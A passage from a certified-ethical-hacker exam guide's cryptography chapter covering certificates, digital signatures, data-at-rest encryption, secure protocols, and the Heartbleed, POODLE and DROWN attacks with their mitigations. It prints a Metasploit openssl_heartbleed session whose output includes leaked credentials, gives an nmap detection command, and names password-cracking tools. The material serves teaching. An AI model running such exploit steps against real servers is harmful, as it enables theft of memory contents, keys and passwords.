signed by something, but the difference between these two types of certs comes down
to who signed it and who validates it. As we’ve covered already, certificates can be used
for a variety of purposes, and each cert is generated for a specific purpose. Suppose you
have an application or service completely internal to your organization, and you want to
provide authentication services via certificates. A self-signed certificate—one created inter-
nally and never intended to be used in any other situation or circumstance—would likely
be your best choice. In most enterprise-level networks, you’re bound to find self-signed
certificates all over the place. They save money and complexity—since there’s no need
to involve an external verification authority—and are relatively easy to put into place.
Managing self-signed certs can sometimes be hard, and any external access to them is a
definite no-no, but internal use is generally accepted.

NOTE In the interest o covering everything, note that EC-Council seems to
center on a sel-signed certiicate being signed by the same entity whose
identity it certiies (that is, signed using the entity’s own private key). In
practice, internal CAs can be (and are) created to handle sel-signed certs
inside the network.

Signed certificates generally indicate a CA is involved and the signature validating the
identity of the entity is confirmed via an external source—in some instances, a validation
authority (VA). Signed certificates, as opposed to self-signed certificates, can be trusted:
assuming the CA chain is validated and not corrupted, it’s good everywhere. Obviously,
anything accessible to (or using) external connectivity requires a signed certificate.

Digital Signatures
Speaking of signed and self-signed certificates, let’s take a few minutes to discuss the
definition and description of the digital signature. The only real reason this is ever a con-
fusing topic is that instructors spend a lot of time drilling into students’ heads that the
public key is for encryption and that the private key is for decryption. In general, this is
a true statement (and I’m willing to bet you’ll see it on your exam that way). However,
remember that the keys are created in pairs—what one key does, the other undoes. If you
encrypt something with the public key, the private key is the only one that can decrypt
it. But that works in reverse, too; if you encrypt something with your private key, only
your public key can decrypt it.

11-ch11.indd 432 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

433

Keeping this in mind, the digital signature is an easy concept to understand. A digi-
tal signature is nothing more than an algorithmic output that is designed to ensure the
authenticity (and integrity) of the sender—basically a hash algorithm. The way it works
is simple:

1. Bob creates a text message to send to Joe.
2. Bob runs his message through a hash and generates an outcome.
3. Bob then encrypts the outcome of that hash with his private key and sends the

message, along with the encrypted hash, to Joe.
4. Joe receives the message and attempts to decrypt the hash with Bob’s public key.

If it works, he knows the message came from Bob because the only thing Bob’s
public key could ever decrypt is something that was encrypted using his private
key in the first place. Since Bob is the only one with that private key—voilà!

NOTE FIPS 186-4 speciies that something called the Digital Signature
Algorithm (DSA) be used in the generation and veriication o digital
signatures. DSA is a Federal Inormation Processing Standard that was
proposed by the National Institute o Standards and Technology (NIST) in
August 1991 or use in its Digital Signature Standard (DSS).

To Sum Up
When it comes to PKI, asymmetric encryption, digital certificates, and digital signatures,
remembering a few important facts will avoid a lot of headaches for you. Keys are gener-
ated in pairs, and what one does, the other undoes. In general, the public key (shared
with everyone) is used for encryption, and the private key (kept only by the owner) is
used for decryption. Although the private key is created to decrypt messages sent to the
owner, it is also used to prove authenticity through the digital signature (encrypting
with the private key allows recipients to decrypt with the readily available public key).
Key generation, distribution, and revocation are best handled within a framework, often
referred to as PKI (public key infrastructure). PKI also allows for the creation and dis-
semination of digital certificates, which are used to prove the identity of an entity on the
network and follow a standard (X.509).

Encrypted Communication
and Cryptography Attacks
Okay, cryptography warriors, we’re almost to the finish line. Hang with me—we have
just a couple more things to get out of the way. They’re important, and you will be tested
on them, so don’t ditch it all just yet. Thus far you’ve learned a bit about what cryptog-
raphy is and what encryption algorithms can do for you. In this section, we cover a few
final pieces of the CEH cryptography exam objective: how people communicate securely
with one another using various encryption techniques, and what attacks allow the ethical
hacker to disrupt or steal that communication. But before we get there, let’s take just a
second to cover something really important—data at rest.

11-ch11.indd 433 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

434

Data at rest (DAR) is a term being bandied about quite a bit lately in the IT security
world, and it’s probably one of the most misunderstood terms by senior management types.
I say it’s misunderstood because data “at rest” means different things to different people.
In general terms, “at rest” means the data is not being accessed, and to many people that
means everything on the drive not currently being modified or loaded into memory. For
example, a folder stored out on a server that’s just sitting there would be at rest because
“nobody is using it.” But in reality there’s more to the definition. The true meaning of data
at rest is data that is in a stored state and not currently accessible. For example, data on a
laptop when the laptop is powered off is in a resting state, and data on a backup drive sitting
off the system/network is at rest, but data in a powered-on, networked, accessible server’s
folder is not—whether it’s currently being used or not right now is immaterial.

DAR vendors are tasked with a simple objective: protect the data on mobile devices
and laptops from loss or theft while it is in a resting state. Usually this entails full disk
encryption (FDE), where pre-boot authentication (usually an account and password) is
necessary to “unlock” the drive before the system can even boot up—once it’s up and
running, protection of the data falls to other measures. The idea is if a bad guy steals
your laptop or mobile device, the data on the drive is protected. FDE can be software
or hardware based, and it can use network-based authentication (Active Directory, for
example) and/or local authentication sources (a local account or locally cached from a
network source). Software-based FDE can even provide central management, making
key management and recovery actions much easier. More than a few products and appli-
cations are available for doing this. Microsoft provided BitLocker on Pro, Enterprise,
and Education releases for exactly this purpose. McAfee has a full disk encryption offer-
ing called Endpoint Encryption, with administrative dashboards and controls. Symantec
Drive Encryption and Gilisoft Full Disk Encryption are other options.

NOTE Another beneit to FDE is protection against the old boot-n-root attack.
A bootable USB you can plug in to, boot o o, and then wreak havoc on the
desktop system? Pt—not only is the data protected, but the OS is, too.

Am I saying that files and folders on active systems don’t require encryption protec-
tion? No, not at all—I’m simply pointing out that DAR protection is designed for a very
specific purpose. Laptops and mobile devices should have FDE because they are taken
offsite and have the potential to be stolen. An HPE ProLiant DL80 on your data floor?
Probably not, unless one of your admins takes it out of the cabinet, unhooks everything,
and carries it home in the evening. And if they’re doing that, you have some serious
physical security issues to deal with.

For the data on those servers that require additional confidentiality protection, of
course encrypt the files or folder, or even the drives themselves, with a tool designed to
help you with that specific security need. NIST gets into a lot of virtual disk and volume
encryption, but I’m not sure that’s all that valuable here. Instead, you should understand
the difference between encrypting an entire disk with a pre-boot authenticating system

11-ch11.indd 434 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

435

Let’s Go to the Source
I was talking about this section of the book with my lovely and talented wife on our
walk today and was expressing my rage at not being able to convince upper man-
agement types (at a previous position) that the true definition of data at rest doesn’t
encompass a storage area network when she said, “No, Matt, that’s not right. SAN
storage is data at rest.” Tic, tic, tic, tic…

After our walk, we went directly to the source, as we often do when we both think
we’re right—in this case, NIST. We viewed two main sources: NIST Special Publi-
cation (SP) 800-111, Guide to Storage Encryption Technologies for End User Devices
(https://csrc.nist.gov/publications/detail/sp/800-111/final), and NIST SP 800-53,
Revision 5, Security and Privacy Controls for Information Systems and Organizations
(https://csrc.nist.gov/publications/detail/sp/800-53-rev5/final). As an aside, I had
to go find a link for 800-53 Rev. 5 myself because my wife was viewing a local copy
on our home computer. When I asked her for the link and she said it was a local
copy, I enquired why she had one stored locally, just sitting there. She responded,
“The bigger question is, why don’t you?” I love that woman.

In any case, at the time of our argument what we found out was…we’re both
right. NIST SP 800-53 Rev. 5, Control SC-28, “Protection of Information at
Rest,” didn’t actually define SAN or any other accessible network location as data
at rest in the control itself, but did define desktops, laptops, mobile devices, and
storage devices as data-at-rest locales—making me right. However, the control
enhancement, SC-28 (1), allowed for system owners to include SAN and other
locales in their data-at-rest control set. It’s not required in the actual control for
“high” security systems, but sometimes the enhancements are written to allow sys-
tem owners some flexibility. In other words, organizations can define what is DAR
and what isn’t, to determine where they’re at risk and to apply security controls
appropriately—all of which made her right.

Interestingly, NIST doesn’t even say you must encrypt these controls—it just says
they must provide for confidentiality. Generally that involves some form of encryp-
tion, but I’m sure somebody somewhere could argue some physical security controls
and others could be used as data-at-rest protection. What’s really important here is
the level of flexibility involved in all of this. Just keep in mind when you’re discuss-
ing this kind of stuff, there’s often more than one right answer—especially if you’re
debating with my wife.

As a side note, Rev 5 has been updated to include, specifically, storage area networks
as being under DAR consideration. So now I have to go admit I’m wrong. Again.

(which changes the MBR) and individual volume, folder, and file encryption. For one
tool example, Microsoft builds Encrypting File System (EFS) into its operating systems
now for files, folders, and drives needing encryption. Other tools range from free prod-
ucts, such as VeraCrypt, AxCrypt, and GNU Privacy Guard (GnuPG), to using PKI

11-ch11.indd 435 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

436

within the system, such as Entrust products. The point is, full disk encryption may
sound like a great idea in the boardroom, but once the drive is unlocked, the data inside
is not protected.

NOTE I security is your highest goal, consider keeping your decryption key
in a separate location than the data you’re encrypting—or example, on a
USB drive.

Encrypted Communication
It’s one thing to protect your data at rest, but it’s another thing altogether to figure out
how to transport it securely and safely. Encryption algorithms—both symmetric and
asymmetric—were designed to help us do both, mainly because when networking and
the Internet were being built, no one even thought security would be an issue.

Want proof? Name some Application layer protocols in your head and think about
how they work. SMTP? Great protocol, used to move e-mail back and forth. Secure?
Heck no—it’s all in plain text. What about Telnet and SNMP? Same thing, and maybe
even worse (SNMP can do bad, bad things in the wrong hands). FTP? Please, don’t even
begin to tell me that’s secure.

So, how can we communicate securely with one another? There are plenty of options,
and I’m sure we could spend an entire book talking about them—but we’re not. The list
provided here obviously isn’t all-inclusive, but it does cover the major communications
avenues and the major topics about them you’ll need a familiarity with for your exam:

• Secure Shell (SSH) SSH is, basically, a secured version of Telnet. SSH uses
TCP port 22, by default, and relies on public key cryptography for its encryption.
Originally designed for remote sessions into Unix machines for command
execution, it can be used as a tunneling protocol. SSH2 is the successor to SSH.
It’s more secure, efficient, and portable, and it includes a built-in encrypted
version of FTP (SFTP).

• Secure Sockets Layer (SSL) SSL encrypts data at the Transport layer, and
above, for secure communication across the Internet. It uses RSA encryption and
digital certificates and can be used with a wide variety of upper-layer protocols.
SSL uses a six-step process for securing a channel, as shown in Figure 11-3. It is
being largely replaced by Transport Layer Security (TLS).

• Transport Layer Security (TLS) Using an RSA algorithm of 1024 and
2048 bits, TLS is the successor to SSL. The handshake portion (TLS Handshake
Protocol) allows both the client and the server to authenticate to each other, and
TLS Record Protocol provides the secured communication channel.

• Internet Protocol Security (IPSec) This is a Network layer tunneling protocol
that can be used in two modes: tunnel (entire IP packet encrypted) and transport
(data payload encrypted). IPSec is capable of carrying nearly any application.

11-ch11.indd 436 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

437

Step 1
Client sends a “Hello” message.

Step 2
Server sends a “Hello” message with SSL version,

Session ID, and Certicate message.

Step 3
Server sends a “Hello done” message.

Step 4
Client veries the certicate and sends the Client Key

Exchange message (including a secret key that the client creates
and then encrypts with the server’s public key).

Step 5
Client send a Finished message with a hash included.

Step 6
Server compares the hash against its computed hash
of the exchange and then sends a Finished message.

Figure 11-3 SSL connection steps

The Authentication Header (AH) protocol verifies an IP packet’s integrity and
determines the validity of its source: it provides authentication and integrity, but
not confidentiality. Encapsulating Security Payload (ESP) encrypts each packet
(in transport mode, the data is encrypted but the headers are not encrypted; in
tunnel mode, the entire packet, including the headers, is encrypted).

• Pretty Good Privacy (PGP) Created way back in 1991, PGP is used for
signing, compression, and encrypting and decrypting e-mails, files, directories,
and even whole disk partitions, mainly in an effort to increase the security of
e-mail communications. PGP follows the OpenPGP standard (RFC 4880) for
encrypting and decrypting data. PGP is known as a hybrid cryptosystem, because
it uses features of conventional and public key cryptography.

NOTE When e-mail is the topic, I’d be remiss in not mentioning S/MIME
(Secure/Multipurpose Internet Mail Extensions). It was originally developed
by RSA Data Security, Inc., and is a standard or public key encryption and
signing o MIME data. The primary dierence between PGP and S/MIME is
that PGP can be used to encrypt not only e-mail messages but also iles and
entire drives.

Even though these are thought of as “secure” methods of communication, don’t get
too comfortable in using them—there’s always room to worry. For example, it seems
2014 was a very bad year for SSL communications, as two very nasty exploits, Heartbleed
and POODLE, apparently came out of nowhere. They caused veritable heart attacks and

11-ch11.indd 437 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

438

seemingly endless activity among security practitioners; not so coincidentally, they will
show up on your exam multiple times. Let’s take a look at each.

In late March 2014, Google’s security team was completing some testing of OpenSSL
and discovered something really terrible. Once they confirmed what they thought they’d
found, Google notified OpenSSL on April 1, 2014, and, six days later, the public was
notified of “the worst vulnerability found (at least in terms of its potential impact) since
commercial traffic began to flow on the Internet” (as described by Forbes cybersecu-
rity columnist Joseph Steinberg in his article “Massive Internet Security Vulnerability—
Here’s What You Need To Do”).

Heartbleed exploits a small feature in OpenSSL that turned out to present a very
big problem. OpenSSL uses a heartbeat during an open session to verify that data was
received correctly, and it does this by “echoing” data back to the other system. Basically,
one system tells the other “I received what you sent and it’s all good. Go ahead and send
more.” In Heartbleed, an attacker sends a single byte of data while telling the server it
sent 64Kb of data. The server will then send back 64Kb of data—64Kb of random data
from its memory.

EXAM TIP You can use the Nmap command nmap -d --script ssl-heartbleed
--script-args vulns.showall -sV [host] to search or the vulnerability: the return
will say “State: NOT VULNERABLE” i you’re good to go.

And what might be in this memory? The sky’s the limit—user names and passwords,
private keys (which are exceptionally troubling because future communication could
be decrypted), cookies, and a host of other nifty bits of information are all in play. This
would be concerning enough if the attack itself weren’t so easy to pull off. Take a peek at
the following code listing showing the use of the Metasploit auxiliary module openssl_
heartbleed. Obviously, a few lines have been redacted to save some space, but it should be
easy enough to see the module load, see some parameters set, initiate it by typing exploit,
and return the 64Kb of memory the server provides (the bolded text).

msf > use auxiliary/scanner/ssl/openssl_heartbleed
msf > auxiliary[openssl_heartbleed] > set RHOSTS 172.16.5.12
RHOSTS => 172.16.5.12
msf > auxiliary[openssl_heartbleed] > set RPORT 443
RPORT => 443
msf > auxiliary[openssl_heartbleed] > set THREADS 50
THREADS => 50
msf > auxiliary[openssl_heartbleed] > set verbose true
verbose => true
msf > auxiliary[openssl_heartbleed] > exploit
[*] 172.16.5.12:443 - Sending Client Hello...
[*] 172.16.5.12:443 - Sending Heartbeat
[*] 172.16.5.12:443 - Heartbeat response, 65551 bytes
[+] 172.16.5.12:443 - Heartbeat response with leak
[*] 172.16.5.12:443 - Printable info leaked:

S@$fy90Q6_fQH5f”!98532ED/AeL6.centos Firefox/3.6.24Accept: image/png,image/*;
q=0,8,*/*;q=0,5Accept Language: en-us,

en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset:

11-ch11.indd 438 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

439

ISO-8859-1,utf -8;q=0.7Kx
----Lines removed ----
----Lines removed ----
MA@1bal93il4bh366179b@k4user=matt&password=P@ssw0rd!$123&timezone

-offset=-5:NJ_,,BR ------
----Lines removed ----

Heartbleed caused major headaches and worry all over the world. Applications and
organizations that were affected included multiple VMware products, Yahoo!, FileMaker,
Cisco routers, HP server applications, SourceForge, and GitHub. And the problems
weren’t just on the commercial side: government agencies everywhere shut down online
services while fix actions were put in place. And it’s not over. Per AVG’s Virus Labs, up to
1.5 percent of websites worldwide are still vulnerable, and there is no telling how many
certificates have not been updated/changed since the fix action (which may leave them
vulnerable if private keys were stolen previously). Add to it “reverse Heartbleed” (where
servers are able to perform the exact same thing in reverse, stealing data from clients) to
compound the issue, and things are still very hairy.

EXAM TIP Another attack you may see reerenced (now or in the near
uture) is FREAK. Factoring Attack on RSA-EXPORT Keys is a man-in-the-
middle attack that orces a downgrade o an RSA key to a weaker length.
The attacker orces the use o a weaker encryption key length, enabling
successul brute-orce attacks.

As if Heartbleed weren’t enough, POODLE (Padding Oracle On Downgraded Legacy
Encryption) was (again) discovered by Google’s security team and announced to the
public on October 14, 2014. This time it was a case of backward compatibility being
a problem. The Transport Layer Security (TLS) protocol had largely replaced SSL for
secure communication on the Internet, but many browsers would still revert to SSL
3.0 when a TLS connection was unavailable. They did this because many TLS clients
performed a handshake effort, designed to degrade service until something acceptable
was found. For example, the browser might offer TLS 1.2 first and, if it fails, retry and
offer 1.0. Supposing a hacker could jump in the connection between client and server, he
could interfere with these handshakes, making them all fail—which results in the client
dropping to SSL 3.0.

NOTE Many o us who lean toward the conspiratorial side question the
timing o these releases. Supposedly Google and Codenomicon discovered
Heartbleed independently, but both notiied OpenSSL on the same date—
April 1. Six days later, the rest o us ound out about it. Did companies like
Yahoo!, Google, and Microsot have a chance to ix Heartbleed on their
applications beore the rest o the world got to hear about it? Makes you
wonder, doesn’t it? Especially since the paper announcing POODLE was
released on October 14, but the date on the release paper read September.

So what’s the big deal? Well, it seems SSL 3.0 uses RC4, and that opens up a whole
world of issues. SSL 3.0 has a design flaw that allows the padding data at the end of a

11-ch11.indd 439 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

440

block cipher to be changed so that the encryption cipher becomes less secure each time
it is passed. Defined as “RC4 biases” in OpenSSL’s paper on the subject (https://www
.openssl.org/~bodo/ssl-poodle.pdf ), if the same secret—let’s say a password—is sent
over several sessions, more and more information about it will leak. Eventually, the con-
nection may as well be plain text (per the same source, an attacker need only make 256
SSL 3.0 requests to reveal 1 byte of encrypted messages), and the attacker sitting in the
middle can see everything.

Mitigation for POODLE is straightforward: just don’t use SSL 3.0 at all. Completely
disabling SSL 3.0 on the client and server sides means the “degradation dance” can’t ever
take things down to SSL 3.0. Of course, in a recurring vein that frustrates and angers
security professionals while simultaneously filling hackers with glee and joy, there are old
clients and servers that just don’t support TLS 1.0 and above. [Insert sigh here.] Therefore,
you can implement TLS_FALLBACK_SCSV (a fake cipher suite advertised in the Client
Hello message, which starts the SSL/TLS handshake) to hopefully prevent the attack.

NOTE Google’s Chrome browser and Google servers already support TLS_
FALLBACK_SCSV, with SSL 3.0 being removed completely. Fallback to SSL 3.0
was disabled in Chrome 39 (November, 2014), and SSL 3.0 was disabled by
deault in Chrome 40 (January, 2015). Mozilla disabled SSL 3.0 in Fireox 34
and ESR 31.3 (December, 2014) and added TLS_FALLBACK_SCSV in Fireox 35.

Another mitigation is to implement something called “anti-POODLE record split-
ting.” In short, this splits records into several parts, ensuring none of them can be
attacked. However, although this may frustrate the exploit’s ability to gather data, it also
may cause compatibility issues due to problems in server-side implementations.

EXAM TIP Know Heartbleed and POODLE very, very well. Open SSL versions
1.0.1 through 1.0.1f are vulnerable to Heartbleed, and its CVE notation is
CVE-2014-0160. Be prepared or scenario-based questions involving SSL
that will reerence this attack—I guarantee you’ll see them. POODLE (aka
PoodleBleed, per EC-Council, CVE-2014-3566) will also appear in questions
throughout your exam.

The last one we’re going to visit before calling it a day is a doozy, and even though it
hasn’t made its way into the official courseware (and by extension your exam) as I write
this, I guarantee it will soon. And I’d much rather give you more than you need now than
to hear about me leaving something out later. As we’ve covered before, modern client/
server communications use TLS, and SSL has been outdated. SSL 3.0, of course, had all
sorts of problems and was disabled everywhere (other than in backward-compatibility-
specific situations). But SSLv2? That’s another story altogether.

NOTE As with most o the technological world, encryption algorithms
get deprecated and replaced rom time to time. This is, and has been,
true or several versions o SSL and TLS. For example, TLS 1.0 and 1.1 were
deprecated in RFC 8996.

11-ch11.indd 440 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

441

It seems during all this hoopla, SSLv2 was…well...forgotten. Sure there were a few
servers out there that still provided support for it, but for the most part that support
didn’t seem to matter to anyone. No up-to-date clients actually used SSLv2, so even
though SSLv2 was known to be badly insecure, merely supporting it wasn’t seen as a
security problem. If there’s no client looking for it, then what difference does it make if
it’s there, right?

Pause for uproarious hacking laughter here, as we all contemplate something any first-
year security student in Hardening of Systems 101 will state as an obvious step: turn off
everything you’re not using.

The DROWN (Decrypting RSA with Obsolete and Weakened eNcryption) attack,
per the website Drown Attack (https://drownattack.com), is a “serious vulnerability that
affects HTTPS and other services that rely on SSL and TLS, some of the essential crypto-
graphic protocols for Internet security. DROWN allows attackers to break the encryption
and read or steal sensitive communications, including passwords, credit card numbers,
trade secrets, or financial data.” When the CVE for DROWN was released in 2016, up to
33 percent of Internet HTTPS servers tested were vulnerable to the attack.

Mitigation for DROWN is much like that for POODLE: turn off support for the
offending encryption (in this case, SSLv2). Additionally, per the Drown Attack website,
“server operators need to ensure that their private keys are not used anywhere with server
software that allows SSLv2 connections. This includes web servers, SMTP servers, IMAP
and POP servers, and any other software that supports SSL/TLS.”

NOTE Remember way back in the beginning o this book I mentioned the
balancing act between security and usability? There is no better example
than the mitigations discussed here. Should you eliminate all backward
compatibility in the name o security, you’ll deinitely ward o the occasional
(and probably rare) attack, but you’ll inevitably be aced with lots o “I can’t
get there because o security” complaints. Weigh your options careully.

Cryptography Attacks
For the ethical hacker, all the preceding information is great to know and is important,
but it’s not enough just to know what types of encryption are available. What we need to
know, what we’re really interested in, is how to crack that encryption so we can read the
information being passed. A variety of methods and tools are available, and a list of the
relevant ones is provided here for your amusement and memorization:

• Known plain-text attack In this attack, the hacker has both plain-text and
corresponding cipher-text messages—the more, the better. The plain-text copies
are scanned for repeatable sequences, which are then compared to the cipher-text
versions. Over time, and with effort, this can be used to decipher the key.

• Chosen plain-text attack In a chosen plain-text attack, the attacker encrypts
multiple plain-text copies himself in order to gain the key.

11-ch11.indd 441 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

442

• Adaptive chosen plain-text attack The EC-Council definition for this is
mind-numbingly obtuse: “the attacker makes a series of interactive queries,
choosing subsequent plaintexts based on the information from the previous
encryptions.” What this really means is the attacker sends bunches of cipher texts
to be decrypted and then uses the results of the decryptions to select different,
closely related cipher texts. The idea is to gradually glean more and more
information about the full target cipher text or about the key itself.

• Cipher-text-only attack In this attack, the hacker gains copies of several
messages encrypted in the same way (with the same algorithm). Statistical
analysis can then be used to reveal, eventually, repeating code, which can be
used to decode messages later.

• Replay attack This is most often performed within the context of a man-in-the-
middle attack. The hacker repeats a portion of a cryptographic exchange in hopes
of fooling the system into setting up a communications channel. The attacker
doesn’t really have to know the actual data (such as the password) being exchanged;
she just has to get the timing right in copying and then replaying the bit stream.
Session tokens can be used in the communications process to combat this attack.

• Chosen cipher attack In this attack, the bad guy (or good guy, depending on
your viewpoint) chooses a particular cipher-text message and attempts to discern
the key through comparative analysis with multiple keys and a plain-text version.
RSA is particularly vulnerable to this attack.

EXAM TIP A side-channel attack isn’t like the other traditional attacks
mentioned. It is a physical attack that monitors environmental actors
(like power consumption, timing, and delay) on the cryptosystem itsel.

Along with these attacks, a couple of other terms are worth discussing here. Man-
in-the-middle is another attack usually listed by many security professionals and study
guides (depending on the test version you get, it may even be listed as such). Just keep in
mind that this term simply means the attacker has positioned himself between the two
communicating entities. Once there, the attacker can launch a variety of attacks (inter-
ference, fake keys, replay, and so on). Additionally, the term brute-force attack is apropos
to discuss in this context. Brute force refers to an attempt to try every possible combina-
tion against a target until successful. Although this can certainly be applied to cracking
encryption schemes—and most commonly is defined that way—it doesn’t belong solely
in this realm (for example, it’s entirely proper to say that using 500 people to test all the
doors at once is a brute-force attack, as is sending an open request to every known port
on a single machine).

NOTE An inerence attack may not be what you think it is. Inference
actually means you can derive inormation rom the cipher text without
actually decoding it. For example, i you are monitoring the encrypted
line a shipping company uses and the traic suddenly increases, you could
assume the company is getting ready or a big delivery.

11-ch11.indd 442 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

443

What’s more, a variety of other encryption-type attack applications are waiting
in the wings. Some applications, such as Carnivore and Magic Lantern (more of a
keylogger than an actual attack application), were created by the U.S. government for
law enforcement use in cracking codes. Some, such as L0phtcrack (used mainly on
Microsoft Windows against SAM password files) and John the Ripper (a Unix/Linux
tool for the same purpose), are aimed specifically at cracking password hashes. Others
might be aimed at a specific type or form of encryption (for example, PGPcrack is
designed to go after PGP-encrypted systems). A few more worth mentioning include
CrypTool (https://www.cryptool.org), CryptoBench (www.addario.org), and Jipher
(www.cipher.org.uk).

Regardless of the attack chosen or the application used to try it, it’s important to
remember that, even though the attack may be successful, attempts to crack encryption
take a long time. The stronger the encryption method and the longer the key used in the
algorithm, the longer the attack will take to be successful. Additionally, it’s not an accept-
able security practice to assign a key and never change it. No matter how long and com-
plex the key, given a sufficient amount of time a brute-force attack will crack it. However,
that amount of time can be from a couple of minutes for keys shorter than 40 bits to 50
or so years for keys longer than 64 bits. Obviously, then, if you combine a long key with
a commitment to changing it within a reasonable time period, you can be relatively sure
the encryption is “uncrackable.” Per the U.S. government, an algorithm using at least a
256-bit key cannot be cracked (for example, AES).

NOTE A truism o hacking really applies here: hackers are generally
interested in the “low-hanging ruit.” The mathematics involved in cracking
encryption usually makes it not worthwhile. Author Bruce Schnier broke
down the amount o energy required to change/encrypt a single bit, then
extrapolated how much work a computer could do given the output o
energy from our sun. The results: “brute-orce attacks against 256-bit keys will
be ineasible until computers are built rom something other than matter
and occupy something other than space.”

Chapter Review
Cryptography is the science or study of protecting information, whether in transit or at
rest, by using techniques to render the information unusable to anyone who does not
possess the means to decrypt it. Plain-text data (something you can read) is turned into
cipher-text data (something you can’t read) by the application of some form of encryp-
tion. Encrypting data provides confidentiality because only those with the “key” can see
it. Integrity can also be provided by hashing algorithms. Nonrepudiation is the means by
which a recipient can ensure the identity of the sender and that neither party can deny
having sent or received the message.

Encryption algorithms—mathematical formulas used to encrypt and decrypt data—are
highly specialized and complex. There are two methods in which the algorithms actually
work, and there are two methods by which keys can be used and shared. In stream ciphers,
bits of data are encrypted as a continuous stream. In other words, readable bits in their

11-ch11.indd 443 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

444

regular pattern are fed into the cipher and are encrypted one at a time. Stream ciphers
work at a high rate of speed. Block ciphers combine data bits into blocks and feed them
into the cipher. Each block of data, usually 64 bits at a time, is then encrypted with the
key and algorithm. These ciphers are considered simpler, and slower, than stream ciphers.

Symmetric encryption, also known as single key or shared key encryption, simply means
one key is used both to encrypt and to decrypt the data. It is considered fast and strong
but poses some significant weaknesses. It’s a great choice for bulk encryption because of
its speed, but key distribution is an issue because the delivery of the key for the secured
channel must be done offline. Additionally, scalability is a concern because as the net-
work gets larger, the number of keys that must be generated goes up exponentially. DES,
3DES, Advanced Encryption Standard (AES), International Data Encryption Algorithm
(IDEA), Twofish, Serpent, TEA, GOST, Camelia, and Rivest Cipher (RC) are examples.

Asymmetric encryption comes down to this: what one key encrypts, the other key
decrypts. It’s important to remember the public key is the one used for encryption,
whereas the private key is used for decryption. Either can be used for encryption or decryp-
tion within the pair, but in general remember public = encrypt, private = decrypt. Asym-
metric encryption can provide both confidentiality and nonrepudiation and solves the
problems of key distribution and scalability. The weaknesses include its performance
(asymmetric is slower than symmetric, especially on bulk encryption) and processing
power (asymmetric usually requires a much longer key length, so it’s suitable for smaller
amounts of data). Diffie-Hellman, Elliptic Curve Cryptosystem (ECC), El Gamal, and
RSA are examples of asymmetric algorithms.

A hashing algorithm is a one-way mathematical function that takes an input and pro-
duces a fixed-length string (usually a number), or hash, based on the arrangement of the
data bits in the input. It provides a means to verify the integrity of a piece of data—change
a single bit in the arrangement of the original data, and you’ll get a different response. The
attack or effort used against a hashing algorithm is known as a collision or a collision attack.
A collision occurs when two or more files create the same output, which is not supposed
to happen. To protect against collision attacks and the use of rainbow tables, you can also
use a salt, which is a collection of random bits used as a key in addition to the hashing
algorithm. MD5, SHA-1, SHA-2, and SHA-3 are examples of hash algorithms.

Steganography is the practice of concealing a message inside a text, image, audio, or
video file in such a way that only the sender and recipient even know of its existence, let
alone the manner in which to decipher it. Indications of steganography include character
positions (in text files, look for text patterns, unusual blank spaces, and language anoma-
lies) and larger than expected file sizes and color palette faults in image files. Audio and
video files require some statistical analysis and specific tools.

In image steganography, there are three main techniques: least significant bit insertion,
masking and filtering, and algorithmic transformation. Masking hides the data in much
the same way as a watermark on a document; however, it’s accomplished by modifying the
luminescence of image parts. Algorithmic transformation allows steganographers to hide
data in the mathematical functions used in image compression. Tools like OmniHide Pro
and Masker do a good job of sticking messages into the video stream smoothly and easily.
DeepSound and MP3Stego are both tools for audio steganography. Other tools include
QuickStego, gifshuffle, SNOW, Steganography Studio, and OpenStego.

11-ch11.indd 444 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

445

Public key infrastructure (PKI) is a system designed to verify and authenticate the iden-
tity of individuals within the enterprise taking part in a data exchange. PKI consists of
hardware, software, and policies that create, manage, store, distribute, and revoke keys
and digital certificates. The system starts at the top, with a (usually) neutral party known
as the certificate authority (CA) that creates and issues digital certificates. The CA also
keeps track of all the certificates within the system and maintains a certificate revocation
list (CRL), used to track which certificates have problems and which have been revoked.
The CA may be internal to begin with, and there could be any number of subordinate
CAs—known as registration authorities (RAs)—to handle things internally (most root
CAs are removed from network access to protect the integrity of the system). In many
PKI systems, an outside entity known as a validation authority (VA) is used to validate
certificates—usually done via Online Certificate Status Protocol (OCSP). A CA can be
set up to trust another CA in a completely different PKI through something called cross-
certification. This allows both PKI CAs to validate certificates generated from either side.

CAs work in a trust model. This describes how entities within an enterprise deal
with keys, signatures, and certificates, and there are three basic models. In the web of
trust, multiple entities sign certificates for one another. In other words, users within this
system trust each other based on certificates they receive from other users on the same
